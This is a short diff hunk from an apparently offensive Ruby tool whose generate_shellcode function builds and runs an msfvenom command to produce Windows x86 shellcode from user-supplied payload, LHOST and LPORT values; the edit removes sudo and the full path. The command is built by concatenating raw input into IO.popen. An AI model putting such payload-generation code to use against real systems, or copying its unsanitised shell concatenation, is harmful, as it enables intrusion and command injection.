@@ -103,8 +103,8 @@ def generate_shellcode (payload, lhost, lport)
 	newVar = ''
 	formattedShellcode = ''
 	#Build the msfvenom command from user input
-	command = (" sudo /usr/local/share/msf/msfvenom -p " + payload + " LHOST=" + lhost +" LPORT=" + lport + " -a x86 --platform windows -f c")
-	puts "Now running" +  command
+	command = ("msfvenom -p " + payload + " LHOST=" + lhost +" LPORT=" + lport + " -a x86 --platform windows -f c")
+	puts "Now running " +  command
 	#Runs commands within sub process, sleeps for 5 seconds while msfvenom builds the shellcode and then assigns it to a variable
 	IO.popen(command) do |f|
 		sleep(5)
